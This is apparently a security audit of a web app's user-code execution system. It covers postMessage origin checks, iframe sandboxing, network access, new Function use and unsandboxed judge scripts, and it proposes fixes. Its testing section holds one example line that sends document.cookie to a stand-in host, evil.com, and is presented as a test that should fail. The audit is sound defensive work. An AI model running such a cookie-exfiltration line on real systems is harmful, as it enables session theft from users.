# Security Analysis: Code Executors

## Executive Summary

⚠️ **CRITICAL SECURITY VULNERABILITIES IDENTIFIED**

The current code execution system has **multiple serious security flaws** that could allow:

-   API key theft
-   Unauthorized API access
-   XSS attacks
-   CSRF attacks
-   Data exfiltration
-   Resource exhaustion

## Detailed Security Issues

### 1. 🔴 CRITICAL: No Origin Validation in postMessage

**Location**: `src/lib/execution/codeExecutor.ts:433, 461, 478`

**Issue**:

```javascript
window.parent.postMessage(messageData, "*");
```

**Risk**:

-   Any website can send messages to your iframe
-   Malicious code can inject fake execution results
-   No validation that messages come from your application

**Impact**: HIGH - Can bypass security checks, inject malicious data

**Fix Required**:

```javascript
// Validate origin
const allowedOrigin = window.location.origin;
window.parent.postMessage(messageData, allowedOrigin);

// In parent, validate:
if (event.origin !== window.location.origin) {
	return; // Reject message
}
```

---

### 2. 🔴 CRITICAL: Full Network Access (fetch, XMLHttpRequest)

**Location**:

-   `codeExecutor.ts` - iframe has access to `fetch`, `XMLHttpRequest`
-   `algo-test-worker.js` - Web Worker has access to `fetch`

**Issue**:

-   User code can make HTTP requests to ANY endpoint
-   Can access your API endpoints with user's cookies (CSRF)
-   Can exfiltrate data to external servers
-   Can make authenticated requests to your backend

**Risk**:

-   API key theft (if keys are in client-side code)
-   Unauthorized API access
-   Data exfiltration
-   CSRF attacks
-   Rate limit abuse

**Impact**: CRITICAL - Can access all authenticated endpoints

**Fix Required**:

```javascript
// In iframe/worker, block network access:
delete window.fetch;
delete window.XMLHttpRequest;
delete window.WebSocket;

// Or use CSP headers to block network requests
```

---

### 3. 🔴 CRITICAL: No Iframe Sandbox Restrictions

**Location**: `src/components/workspace/Console/components/console.tsx:81-91`

**Issue**:

```jsx
<iframe
  ref={iframeRef}
  sandbox="allow-scripts allow-modals"
  ...
/>
```

**Current sandbox allows**:

-   ✅ `allow-scripts` - Can execute JavaScript (needed)
-   ✅ `allow-modals` - Can show alerts (may not be needed)

**Missing restrictions**:

-   ❌ No `allow-same-origin` (good - prevents access to parent)
-   ❌ But still allows network requests via fetch/XHR
-   ❌ No CSP (Content Security Policy) to block network

**Risk**: Medium - Network access is the bigger issue

**Fix Required**:

```jsx
// Add CSP meta tag in iframe content
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval'; connect-src 'none';">
```

---

### 4. 🟠 HIGH: Server-Side Code Execution (algoTestExecutor)

**Location**: `src/lib/execution/algoTestExecutor.ts`

**Issue**:

-   Uses `new Function()` to execute user code
-   If run server-side, has access to:
    -   Environment variables (`process.env`)
    -   Database connections
    -   File system
    -   All Node.js APIs

**Risk**:

-   API key theft (OPENAI_API_KEY, DATABASE_URL, etc.)
-   Database access
-   File system access
-   Server resource exhaustion

**Impact**: CRITICAL if run server-side

**Current Status**:

-   ✅ Uses Web Worker in browser (good)
-   ⚠️ Falls back to direct execution (dangerous if server-side)

**Fix Required**:

```typescript
// Never run user code server-side
if (typeof window === "undefined") {
	throw new Error("User code execution not allowed server-side");
}
```

---

### 5. 🟠 HIGH: Storage Access (localStorage, sessionStorage)

**Location**: `codeExecutor.ts:377`

**Issue**:

-   Code mentions `localStorage`, `sessionStorage`, `indexedDB`
-   Iframe can potentially access storage (depends on sandbox)

**Risk**:

-   Theft of encrypted progress data
-   Session hijacking
-   Data corruption

**Impact**: MEDIUM - Depends on sandbox configuration

**Current Status**:

-   ✅ Sandbox doesn't include `allow-same-origin` (good)
-   ⚠️ But code tries to access sessionStorage (line 325)

**Fix Required**:

-   Remove storage access attempts
-   Or ensure sandbox blocks it

---

### 6. 🟡 MEDIUM: Custom Judge Script Execution

**Location**: `src/lib/execution/judges.ts:390`

**Issue**:

```javascript
const judgeFn = new Function(
	"args",
	"returnValue",
	"expected",
	"roundTo5Decimals",
	"deepEqual",
	`${config.script}`
);
```

**Risk**:

-   Arbitrary code execution in judge scripts
-   No sandboxing (comment mentions vm2 but not implemented)
-   Can access all Node.js/browser APIs

**Impact**: MEDIUM - Only affects problems with custom judges

**Fix Required**:

-   Use `vm2` or similar for sandboxing
-   Or restrict judge scripts to specific operations only

---

### 7. 🟡 MEDIUM: No Rate Limiting on Code Execution

**Location**: Execution endpoints

**Issue**:

-   No rate limiting on code execution requests
-   Can be used for DoS attacks
-   Can exhaust server resources

**Impact**: MEDIUM - Resource exhaustion

**Fix Required**:

-   Add rate limiting to execution endpoints
-   Limit execution frequency per user

---

### 8. 🟡 MEDIUM: Web Worker Message Validation

**Location**: `src/lib/execution/algoTestExecutor.ts:101`

**Issue**:

-   Only validates `messageId`, not origin
-   Worker can receive messages from any source (if compromised)

**Risk**:

-   Message injection
-   Data manipulation

**Impact**: MEDIUM - Lower risk than iframe (worker is more isolated)

**Fix Required**:

-   Validate message structure
-   Add origin checks if possible

---

## Security Recommendations

### Immediate Actions (Critical)

1. **Block Network Access**

    ```javascript
    // In iframe content
    delete window.fetch;
    delete window.XMLHttpRequest;
    delete window.WebSocket;
    delete window.navigator.sendBeacon;
    ```

2. **Add Origin Validation**

    ```javascript
    // In parent
    if (event.origin !== window.location.origin) {
    	return;
    }
    ```

3. **Prevent Server-Side Execution**

    ```typescript
    if (typeof window === "undefined") {
    	throw new Error("User code execution not allowed server-side");
    }
    ```

4. **Add CSP Headers**
    ```html
    <meta
    	http-equiv="Content-Security-Policy"
    	content="default-src 'self'; 
                   script-src 'unsafe-inline' 'unsafe-eval'; 
                   connect-src 'none'; 
                   object-src 'none';"
    />
    ```

### Short-Term Improvements

5. **Sandbox Custom Judges**

    - Use `vm2` or `isolated-vm` for Node.js
    - Or restrict to safe operations only

6. **Add Rate Limiting**

    - Limit executions per user/IP
    - Add timeout limits

7. **Input Sanitization**

    - Validate code structure
    - Block dangerous patterns (eval, Function constructor in user code)

8. **Audit Logging**
    - Log all code executions
    - Monitor for suspicious patterns

### Long-Term Improvements

9. **Use Dedicated Execution Service**

    - Run code in isolated containers (Docker)
    - Use services like AWS Lambda, Google Cloud Functions
    - Implement proper sandboxing

10. **Code Analysis**

    - Static analysis to detect dangerous patterns
    - Block known attack vectors

11. **Resource Limits**
    - CPU time limits
    - Memory limits
    - Network quotas

---

## Current Security Posture

### ✅ What's Protected

-   ✅ Web Workers are isolated (no DOM access)
-   ✅ Iframe sandbox prevents same-origin access
-   ✅ Timeout protection prevents infinite loops
-   ✅ Worker termination can kill malicious code

### ❌ What's Vulnerable

-   ❌ Network access (fetch/XHR)
-   ❌ No origin validation
-   ❌ Server-side execution risk
-   ❌ Custom judge scripts unsandboxed
-   ❌ No rate limiting
-   ❌ Storage access attempts

---

## Risk Assessment

| Vulnerability         | Severity | Likelihood | Impact   | Priority |
| --------------------- | -------- | ---------- | -------- | -------- |
| Network Access        | CRITICAL | HIGH       | CRITICAL | P0       |
| No Origin Validation  | HIGH     | MEDIUM     | HIGH     | P0       |
| Server-Side Execution | CRITICAL | LOW\*      | CRITICAL | P1       |
| Storage Access        | MEDIUM   | LOW        | MEDIUM   | P2       |
| Custom Judge Scripts  | MEDIUM   | LOW        | MEDIUM   | P2       |
| No Rate Limiting      | MEDIUM   | MEDIUM     | MEDIUM   | P2       |

\*Low if only run client-side, but needs verification

---

## Testing Recommendations

1. **Test Network Blocking**

    ```javascript
    // Try in user code:
    fetch("https://evil.com/steal?data=" + document.cookie);
    // Should fail
    ```

2. **Test Origin Validation**

    - Create malicious page that sends postMessage
    - Verify it's rejected

3. **Test Server-Side Protection**

    - Verify algoTestExecutor never runs server-side
    - Add explicit checks

4. **Penetration Testing**
    - Hire security audit
    - Test with real attack scenarios

---

## Conclusion

The code execution system has **critical security vulnerabilities** that need immediate attention. The most urgent issues are:

1. **Network access** - Can make API calls, exfiltrate data
2. **No origin validation** - Can receive malicious messages
3. **Server-side execution risk** - Can access secrets

**Recommendation**: Implement fixes for P0 issues immediately before production deployment.
